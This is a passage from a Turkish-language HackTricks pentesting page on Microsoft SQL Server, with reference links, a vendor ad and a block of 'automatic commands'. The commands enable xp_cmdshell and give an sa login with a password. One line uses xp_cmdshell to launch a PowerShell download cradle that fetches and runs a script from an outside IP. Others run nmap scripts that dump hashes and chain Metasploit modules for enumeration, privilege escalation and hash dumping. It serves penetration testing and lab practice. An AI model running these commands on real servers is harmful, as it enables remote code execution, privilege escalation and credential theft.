* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zafiyetleri bulun ve daha hızlı düzeltebilin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## HackTricks Otomatik Komutları
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
